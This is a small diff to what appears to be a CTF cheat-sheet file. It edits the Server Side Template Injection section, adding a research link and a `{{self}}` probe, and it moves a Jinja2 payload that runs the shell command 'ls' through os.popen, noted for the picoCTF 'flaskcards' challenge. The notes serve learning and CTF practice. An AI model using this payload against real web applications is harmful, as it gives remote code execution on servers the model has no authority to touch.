@@ -53,6 +53,10 @@ print gold
 ```
 
 ### Server Side Template Injection
+[James Kettle](https://portswigger.net/research/server-side-template-injection)
+```{{self}}```
 
-```{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}``` ```pico18/flaskcards```
 <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>
+```{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}``` ```pico18/flaskcards```
+
+
